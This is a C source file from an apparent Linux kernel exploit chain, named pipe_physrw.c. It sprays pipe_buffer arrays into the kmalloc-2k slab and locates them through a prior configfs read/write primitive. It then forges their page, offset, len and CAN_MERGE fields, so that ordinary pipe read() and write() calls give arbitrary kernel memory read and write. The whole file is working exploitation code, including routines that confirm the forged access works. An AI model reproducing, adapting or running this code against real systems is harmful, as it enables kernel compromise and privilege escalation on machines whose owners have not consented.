/*
 * pipe_physrw.c -- Pipe buffer-based physical memory read/write
 *
 * Upgrades the configfs read/write primitive to support arbitrary byte
 * counts (including single bytes) by forging kernel pipe_buffer entries.
 *
 * Strategy:
 *   page_base (set by the configfs exploit) points to a 32KB slab region
 *   we can already read/write via configfs.  We allocate pipe_buffer
 *   arrays (kmalloc-2k) hoping they land in that same slab, then scan
 *   with configfs to locate and forge them.  Once forged, standard pipe
 *   read()/write() syscalls give us arbitrary kernel memory access.
 *
 * This file replaces the pipe physrw functions in pipe.c.  Do not
 * compile both translation units into the same binary.
 */

#include "common.h"
#include "runtime_struct_offsets.h"

/* ---------- module constants ---------- */

/*
 * VMEMMAP_START / VMEMMAP_END are already defined via target.h / common.h.
 * PIPE_SLAB_SIZE is (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB) = 32KB.
 * We only add constants that differ from the common.h pipe machinery.
 */

#define PHYSRW_SCAN_CHUNK     256
#define PHYSRW_RECLAIM_COUNT  16
#define PHYSRW_DRAIN_COUNT    64
#define PHYSRW_PROOF_OFF      0x7000

/* ---------- module state ---------- */

static int pr_drain_fds[PHYSRW_DRAIN_COUNT][2];
static int pr_reclaim_fds[PHYSRW_RECLAIM_COUNT][2];
static int pr_pipes_ready;

static uintptr_t pr_buf_base;       /* page within order-3 region where bufs live */
static uintptr_t pr_buf_addr;       /* exact kernel address of matched pipe_buffer */
static int       pr_pipe_idx = -1;  /* index into pr_reclaim_fds */

/* Diagnostic globals referenced by fops.c */
int pipe_cache_gate_ok;
int physrw_read_ok;
int physrw_write_ok;
int physrw_read64_ok;
int physrw_write64_ok;

/* Other extern globals declared in common.h that pipe.c normally provides.
 * Defined here so the translation unit is self-contained for linkage. */
pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;

/* ---------- runtime offset helpers ---------- */

/*
 * Use active_offsets when available, fall back to target.h compile-time
 * constants otherwise.
 */
static uintptr_t pr_pipe_buf_ops(void) {
  uint64_t off = (active_offsets && active_offsets->off_anon_pipe_buf_ops)
    ? active_offsets->off_anon_pipe_buf_ops : ANON_PIPE_BUF_OPS_OFF;
  return text_addr(KIMAGE_TEXT_BASE + off);
}

static uintptr_t pr_kmalloc_caches(void) {
  uint64_t off = (active_offsets && active_offsets->off_kmalloc_caches)
    ? active_offsets->off_kmalloc_caches : KMALLOC_CACHES_OFF;
  return data_addr(KIMAGE_TEXT_BASE + off);
}

/* ---------- vmemmap conversion ---------- */

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uint64_t compound_head =
    kernel_read64(fd, page + STRUCT_PAGE_COMPOUND_HEAD_OFF);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

/* ---------- pipe buffer allocation helpers ---------- */

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
}

void alloc_pipe_object(int pipefd[2]) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, PIPE_BUFFER_SLOTS * PAGE_SIZE));
}

void free_pipe_object(int pipefd[2]) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
}

/* ---------- pipe buffer preparation (simplified) ---------- */

/*
 * Allocate pipe_buffer arrays hoping they land in the same kmalloc-2k
 * slab as page_base.
 *
 * The drain pipes consume free slots in existing partial slabs.
 * The reclaim pipes should then spill into the page_base slab.
 */
static void pr_prepare_pipe_buffers(void) {
  int i;

  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    make_pipe_object(pr_drain_fds[i]);
  }
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    make_pipe_object(pr_reclaim_fds[i]);
  }
  pr_pipes_ready = 1;

  /* Drain: expand to full size (32 slots each -> kmalloc-2k allocation) */
  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    alloc_pipe_object(pr_drain_fds[i]);
  }

  /* Reclaim: expand to full size -- should land near page_base */
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    alloc_pipe_object(pr_reclaim_fds[i]);
  }
}

/* ---------- cache gate verification ---------- */

/*
 * Verify that page_base's slab belongs to the kmalloc cache used by
 * pipe_buffer arrays (kmalloc-2k).  Scan each 4K page in the order-3
 * (32KB) region and check the slab_cache metadata.
 *
 * On success, sets pr_buf_base to the matching page and returns 1.
 */
static int pr_cache_gate(int fd) {
  if (!is_direct_ptr(page_base)) {
    return 0;
  }

  /* Read the full kmalloc cache pointer table */
  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  kernel_read_data(fd, pr_kmalloc_caches(), cache_slots, sizeof(cache_slots));

  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  /* The pipe_buffer array for 32 slots (32 * 0x28 = 0x500 bytes) goes
   * into kmalloc-2k.  Check both normal and cgroup variants. */
  uint64_t want_normal = cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS +
                                     KMALLOC_PIPE_INDEX];
  uint64_t want_cgroup = cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS +
                                     KMALLOC_PIPE_INDEX];
  kmalloc_pipe_cache = want_cgroup ? want_cgroup : want_normal;

  pr_info("physrw cache gate normal_2k=%016llx cgroup_2k=%016llx\n",
          (unsigned long long)want_normal,
          (unsigned long long)want_cgroup);

  /* Scan each page in the order-3 region */
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page_va = page_base + off;
    uintptr_t head = direct_to_head_page(fd, page_va);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);

    if (off == 0 || slab_cache != 0) {
      candidate_slab_cache = slab_cache;
    }

    int match = slab_cache != 0 &&
      (slab_cache == want_normal || slab_cache == want_cgroup);

    if (match) {
      pr_buf_base = page_va;
      pipe_cache_page_index = (int)(off / PAGE_SIZE);
      pipe_cache_gate_ok = 1;
      pr_info("physrw cache gate OK idx=%zu slab=%016llx\n",
              off / PAGE_SIZE, (unsigned long long)slab_cache);
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

/* ---------- pipe buffer scanning ---------- */

/*
 * Scan the slab at 'base' for a valid pipe_buffer entry.
 *
 * Before calling this, each reclaim pipe has had (i+1) bytes written
 * to it.  The kernel sets pipe_buffer.len to the amount of data in the
 * buffer, so we can identify which pipe a buffer belongs to by its len
 * field (len == i+1 => pipe index i).
 *
 * A valid entry has:
 *   page   in [VMEMMAP_START, VMEMMAP_END)
 *   offset == 0
 *   ops    == anon_pipe_buf_ops (runtime address)
 *   flags  == PIPE_BUF_FLAG_CAN_MERGE
 *   private == 0
 *   len    in [1, PHYSRW_RECLAIM_COUNT]
 */
static int pr_find_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pr_buf_addr = 0;
  pr_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;

  /* Read the slab in small chunks */
  for (size_t off = 0; off < ORDER3_SIZE; off += PHYSRW_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PHYSRW_SCAN_CHUNK) !=
        PHYSRW_SCAN_CHUNK) {
      return 0;
    }
  }

  /* Save first 32 bytes for diagnostics */
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  uintptr_t expected_ops = pr_pipe_buf_ops();

  for (size_t off = 0;
       off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));

    /* First filter: page pointer must be in vmemmap range */
    if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END) {
      continue;
    }
    pipe_scan_vmemmap++;

    if (pipe_scan_first_page == 0) {
      pipe_scan_first_page = pb.page;
      pipe_scan_first_ops = pb.ops;
      pipe_scan_first_len = pb.len;
      pipe_scan_first_flags = pb.flags;
    }

    if (pb.ops == expected_ops) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= (uint32_t)PHYSRW_RECLAIM_COUNT) {
      pipe_scan_len++;
    }

    /* Full validation */
    if (pb.offset != 0 || pb.ops != expected_ops ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > (uint32_t)PHYSRW_RECLAIM_COUNT) {
      continue;
    }

    pr_buf_addr = base + off;
    pr_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

/* ---------- pipe-based physical read ---------- */

/*
 * Read 'len' bytes from kernel address 'direct_addr' via pipe.
 *
 * Saves the original pipe_buffer, forges it to point at the target page
 * with len=requested+1 (so the kernel thinks there is data), reads from
 * the pipe fd, then restores the original buffer.
 */
int pipe_phys_read_data(int fd, uintptr_t direct_addr,
                        void *out, size_t len) {
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  /* Save original pipe_buffer */
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  /* Forge: point at target page, set len=requested+1 so kernel sees data */
  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pr_pipe_buf_ops();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* Read from pipe -- kernel copies from forged page */
  ssize_t got = read(pr_reclaim_fds[pr_pipe_idx][0], out, len);
  int ok = got == (ssize_t)len;

  /* Restore original pipe_buffer */
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return ok;
}

/* ---------- pipe-based physical write ---------- */

/*
 * Write 'len' bytes to kernel address 'direct_addr' via pipe.
 *
 * Forges the pipe_buffer with len=0 and CAN_MERGE, which makes the
 * kernel append our write data directly to the forged page.
 */
int pipe_phys_write_data(int fd, uintptr_t direct_addr,
                         const void *data, size_t len) {
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  /* Save original pipe_buffer */
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  /* Forge: point at target page, len=0 + CAN_MERGE lets kernel append */
  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pr_pipe_buf_ops();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  /* Write to pipe -- kernel copies to forged page */
  ssize_t wrote = write(pr_reclaim_fds[pr_pipe_idx][1], data, len);
  int ok = wrote == (ssize_t)len;

  /* Restore original pipe_buffer */
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return ok;
}

/* ---------- convenience wrappers ---------- */

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

/* ---------- reset ---------- */

void reset_pipe_attempt(void) {
  if (pr_pipes_ready) {
    for (int i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
      close(pr_drain_fds[i][0]);
      close(pr_drain_fds[i][1]);
    }
    for (int i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
      close(pr_reclaim_fds[i][0]);
      close(pr_reclaim_fds[i][1]);
    }
    pr_pipes_ready = 0;
  }

  pr_buf_base = 0;
  pr_buf_addr = 0;
  pr_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

/* ---------- orchestration ---------- */

/*
 * Set up pipe-based physical read/write.
 *
 * Steps:
 *   1. Allocate drain + reclaim pipe objects
 *   2. Verify page_base slab belongs to the right kmalloc cache
 *   3. Write size markers to identify individual pipe buffers
 *   4. Scan the slab for a valid pipe_buffer entry
 *   5. Verify read and write via the forged buffer
 *
 * Returns 1 on success, 0 on failure.
 */
int install_pipe_physrw(int configfs_fd) {
  /* Step 1: allocate pipe buffers near page_base */
  pr_prepare_pipe_buffers();

  /* Step 2: verify slab cache match */
  if (!pr_cache_gate(configfs_fd)) {
    pr_info("physrw cache gate FAILED candidate=%016llx want=%016llx\n",
            (unsigned long long)candidate_slab_cache,
            (unsigned long long)kmalloc_pipe_cache);
    return 0;
  }

  /* Step 3: write size markers for pipe identification.
   * Pipe i gets (i+1) bytes written, so pipe_buffer.len == i+1. */
  char marker[PHYSRW_RECLAIM_COUNT];
  memset(marker, 0x61, sizeof(marker));
  for (int i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    SYSCHK(write(pr_reclaim_fds[i][1], marker, i + 1));
  }

  /* Step 4: scan for pipe_buffer */
  int found = pr_find_buffer(configfs_fd, pr_buf_base);
  pr_info("physrw probe found=%d buf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pr_buf_addr, pr_pipe_idx,
          pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }

  /* Step 5: verify vmemmap round-trip */
  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page_va =
    page_to_direct(direct_to_page(proof_addr));
  if (proof_page_va != (proof_addr & ~(PAGE_SIZE - 1))) {
    pr_info("physrw vmemmap roundtrip FAILED\n");
    return 0;
  }

  /* Step 6: verify read -- write via configfs, read back via pipe */
  char seed[] = "ghostlock_physrw_read";
  if (kernel_write_data(configfs_fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(configfs_fd, proof_addr,
                        physrw_readback, sizeof(seed));
  pr_info("physrw read verify ok=%d idx=%d\n",
          physrw_read_ok, pr_pipe_idx);

  /* Step 7: verify write -- write via pipe, read back via configfs */
  char overwrite[] = "ghostlock_physrw_write";
  physrw_write_ok =
    pipe_phys_write_data(configfs_fd, proof_addr,
                         overwrite, sizeof(overwrite));
  pr_info("physrw write verify ok=%d\n", physrw_write_ok);
  kernel_read_data(configfs_fd, proof_addr,
                   physrw_after_write, sizeof(overwrite));

  /* Step 8: verify 64-bit read/write */
  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = 0x676c6b5f72773064ULL;
  uint64_t next64 = 0x676c6b5f72773164ULL;
  kernel_write_data(configfs_fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(configfs_fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("physrw read64 ok=%d value=%016llx\n",
          physrw_read64_ok, (unsigned long long)physrw_read64_before);

  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(configfs_fd, proof64_addr, next64);
  kernel_read_data(configfs_fd, proof64_addr,
                   &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  int all_ok =
    physrw_read_ok &&
    memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
    physrw_write_ok &&
    memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
    physrw_read64_ok && physrw_write64_ok;

  if (all_ok) {
    pr_info("physrw installed OK buf=%016zx pipe=%d\n",
            pr_buf_addr, pr_pipe_idx);
  }

  return all_ok;
}
